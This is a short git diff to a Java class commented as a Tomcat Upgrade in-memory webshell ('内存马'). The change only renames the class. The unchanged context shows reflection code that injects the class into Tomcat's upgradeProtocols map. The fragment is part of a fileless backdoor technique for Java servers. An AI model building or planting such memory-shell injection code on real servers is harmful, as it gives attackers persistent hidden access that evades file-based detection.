@@ -20,7 +20,7 @@ import java.util.HashMap;
 /**
  * Tomcat Upgrade 内存马
  */
-public class TUGMSFromJMXuP implements UpgradeProtocol {
+public class TUGMSFromJMX implements UpgradeProtocol {
     public static String pattern;
 
     static {
@@ -58,7 +58,7 @@ public class TUGMSFromJMXuP implements UpgradeProtocol {
                     upgradeProtocolsField.setAccessible(true);
                     HashMap<String, UpgradeProtocol> upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
 
-                    upgradeProtocols.put(pattern.substring(1), new TUGMSFromJMXuP());
+                    upgradeProtocols.put(pattern.substring(1), new TUGMSFromJMX());
                     upgradeProtocolsField.set(handler, upgradeProtocols);
                     break;
                 }
